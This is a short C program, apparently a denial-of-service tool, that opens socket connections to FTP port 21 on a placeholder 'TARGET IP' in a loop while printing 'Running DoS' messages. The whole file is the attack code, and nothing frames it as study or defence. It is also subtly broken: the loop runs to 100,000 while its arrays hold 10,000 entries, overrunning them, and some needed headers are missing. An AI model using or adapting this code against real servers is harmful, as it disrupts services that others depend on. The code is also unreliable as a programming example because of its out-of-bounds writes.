#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main(void) {
	int s;
	int connection;

	struct sockaddr_in target;
	target.sin_family = AF_INET;	// AF_INET : TCP
	target.sin_port = htons(21);	// Port 21: FTP
	target.sin_addr.s_addr = inet_addr("TARGET IP"); // inet_addr translate address.

	int actual_sockets[10000];
	int actual_conns[10000];
	for (int i = 0;i <= 100000; i++) {
		actual_sockets[i] = socket(AF_INET, SOCK_STREAM, 0);
		actual_conns[i] = connect(actual_sockets[i], (struct sockaddr *)&target, sizeof target); // Connection
		printf("[!] Running DoS | Sockets: %d\n", i);
	}
	return 0;
}
